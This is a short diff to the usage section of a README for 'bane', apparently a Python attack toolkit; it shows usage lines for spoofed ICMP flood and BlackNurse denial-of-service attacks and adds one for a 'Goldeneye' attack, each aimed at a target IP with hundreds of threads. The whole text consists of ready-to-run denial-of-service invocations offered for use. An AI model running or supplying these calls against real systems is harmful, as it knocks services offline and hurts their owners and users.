@@ -171,3 +171,5 @@ II-Usage:
 <br>bane.spoofed_icmp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 , interval=0.001 , threads=500 )
 <h4>BlackNurse attack:</h4>
 <br>bane.blacknurse(IP, p= port , duration= 300 , interval=0.001 , threads=500 )
+<h4>Goldeneye attack:</h4>
+<br>bane.goldeneye(IP, p= port , duration= 300 , threads=500 , timeout=5 )
